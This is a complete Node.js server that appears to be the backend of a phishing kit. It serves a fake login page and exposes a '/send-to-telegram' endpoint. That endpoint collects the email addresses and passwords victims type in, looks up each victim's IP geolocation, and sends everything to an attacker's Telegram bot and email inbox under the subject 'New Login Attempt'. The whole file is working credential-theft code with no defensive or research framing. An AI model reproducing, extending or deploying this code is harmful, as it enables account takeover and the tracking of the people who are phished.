const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');
require('dotenv').config();

// --- TELEGRAM BOT CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// --- EMAIL CONFIGURATION ---
const SMTP_HOST = process.env.SMTP_HOST;
const SMTP_PORT = parseInt(process.env.SMTP_PORT);
const SMTP_USER = process.env.SMTP_USER;
const SMTP_PASS = process.env.SMTP_PASS;
const RECIPIENT_EMAIL = process.env.RECIPIENT_EMAIL;

const PORT = 8000;

// Function to get public IP
async function getPublicIP() {
  return new Promise((resolve, reject) => {
    http.get('http://api.ipify.org?format=json', (res) => {
      let body = '';
      res.on('data', (chunk) => {
        body += chunk;
      });
      res.on('end', () => {
        try {
          const data = JSON.parse(body);
          resolve(data.ip);
        } catch (error) {
          reject(error);
        }
      });
    }).on('error', reject);
  });
}

// Function to get accurate geolocation
async function getIPGeolocation(ip) {
  return new Promise((resolve, reject) => {
    // If it's localhost, get public IP first
    if (ip === '127.0.0.1' || ip === '::1' || ip === '::ffff:127.0.0.1') {
      getPublicIP()
        .then((publicIp) => getGeolocationForIP(publicIp))
        .then(resolve)
        .catch(reject);
    } else {
      getGeolocationForIP(ip).then(resolve).catch(reject);
    }
  });
}

async function getGeolocationForIP(ip) {
  return new Promise((resolve, reject) => {
    const url = `http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`;
    http.get(url, (res) => {
      let body = '';
      res.on('data', (chunk) => {
        body += chunk;
      });
      res.on('end', () => {
        try {
          const data = JSON.parse(body);
          resolve(data);
        } catch (error) {
          reject(error);
        }
      });
    }).on('error', (error) => {
      reject(error);
    });
  });
}

// Function to get client IP from request
function getClientIP(req) {
  const xForwardedFor = req.headers['x-forwarded-for'];
  if (xForwardedFor) {
    return xForwardedFor.split(',')[0].trim();
  }
  return req.socket.remoteAddress || req.connection.remoteAddress || '127.0.0.1';
}

// Function to send message to Telegram
function sendToTelegram(message) {
  return new Promise((resolve, reject) => {
    if (!TELEGRAM_BOT_TOKEN) {
      console.log('Telegram: No bot token');
      resolve(false);
      return;
    }
    if (!TELEGRAM_CHAT_ID) {
      console.log('Telegram: No chat ID');
      resolve(false);
      return;
    }

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });

    const options = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData, 'utf8')
      }
    };

    const req = https.request(url, options, (res) => {
      let body = '';
      res.on('data', (chunk) => {
        body += chunk;
      });
      res.on('end', () => {
        try {
          const jsonResponse = JSON.parse(body);
          if (jsonResponse.ok) {
            console.log('Telegram message sent successfully');
            resolve(true);
          } else {
            console.error('Telegram error:', jsonResponse);
            resolve(false);
          }
        } catch (e) {
          console.error('Telegram parse error:', e);
          resolve(false);
        }
      });
    });

    req.on('error', (error) => {
      console.error('Telegram request error:', error);
      reject(error);
    });

    req.write(postData);
    req.end();
  });
}

// Function to send email
async function sendEmail(data) {
  return new Promise((resolve, reject) => {
    if (!SMTP_HOST || !SMTP_PORT || !SMTP_USER || !SMTP_PASS || !RECIPIENT_EMAIL) {
      resolve(false);
      return;
    }

    const transporter = nodemailer.createTransport({
      host: SMTP_HOST,
      port: SMTP_PORT,
      secure: SMTP_PORT === 465,
      auth: {
        user: SMTP_USER,
        pass: SMTP_PASS
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    const mailOptions = {
      from: SMTP_USER,
      to: RECIPIENT_EMAIL,
      subject: 'New Login Attempt',
      text: data
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error('Email error:', error);
        resolve(false);
      } else {
        console.log('Email sent successfully');
        resolve(true);
      }
    });
  });
}

const mimeTypes = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.css': 'text/css',
  '.json': 'application/json',
  '.png': 'image/png',
  '.jpg': 'image/jpg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  if (req.method === 'POST' && req.url === '/send-to-telegram') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', async () => {
      try {
        const data = JSON.parse(body);

        const clientIP = getClientIP(req);
        let geoData = {};
        try {
          geoData = await getIPGeolocation(clientIP);
        } catch (e) {
          console.error('Geolocation error:', e);
          geoData = { status: 'fail', query: clientIP };
        }

        let message = '';
        if (data.email) {
          message += `Email: ${data.email}\n`;
        }
        if (data.password) {
          message += `Password: ${data.password}\n`;
        }
        if (data.staySignedIn !== undefined) {
          message += `Stay Signed In: ${data.staySignedIn ? 'Yes' : 'No'}\n`;
        }

        message += `\nLocation Info:\n`;
        message += `IP: ${geoData.query || clientIP}\n`;
        message += `Country: ${geoData.country || 'N/A'} (${geoData.countryCode || 'N/A'})\n`;
        message += `State/Region: ${geoData.regionName || 'N/A'} (${geoData.region || 'N/A'})\n`;
        message += `City: ${geoData.city || 'N/A'}\n`;
        message += `ZIP/Postal Code: ${geoData.zip || 'N/A'}\n`;
        message += `Coordinates: ${geoData.lat || 'N/A'}, ${geoData.lon || 'N/A'}\n`;
        message += `Timezone: ${geoData.timezone || 'N/A'}\n`;
        message += `Network/ISP: ${geoData.isp || 'N/A'}\n`;
        message += `Organization: ${geoData.org || 'N/A'}\n`;
        message += `AS: ${geoData.as || 'N/A'}\n`;
        message += `Platform: ${data.platformDetails || 'N/A'}\n`;
        message += `Time: ${new Date().toLocaleString()}`;

        console.log('Sending message:', message);
        await sendToTelegram(message);
        await sendEmail(message);

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true }));
      } catch (error) {
        console.error('Error:', error);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: error.message }));
      }
    });
    return;
  }

  let filePath = '.' + req.url;
  if (filePath === './') {
    filePath = './index.html';
  }

  const extname = String(path.extname(filePath)).toLowerCase();
  const contentType = mimeTypes[extname] || 'application/octet-stream';

  fs.readFile(filePath, (error, content) => {
    if (error) {
      if(error.code == 'ENOENT') {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end('<h1>404 Not Found</h1>', 'utf-8');
      } else {
        res.writeHead(500);
        res.end('Server Error: ' + error.code, 'utf-8');
      }
    } else {
      res.writeHead(200, { 'Content-Type': contentType });
      res.end(content, 'utf-8');
    }
  });
});

server.listen(PORT, () => {
  console.log(`\nServer running at http://localhost:${PORT}/`);

  const { exec } = require('child_process');
  const url = `http://localhost:${PORT}`;

  switch (process.platform) {
    case 'darwin':
      exec(`open ${url}`);
      break;
    case 'win32':
      exec(`start ${url}`);
      break;
    case 'linux':
      exec(`xdg-open ${url}`);
      break;
    default:
      console.log(`Please open ${url} in your browser.`);
  }
});
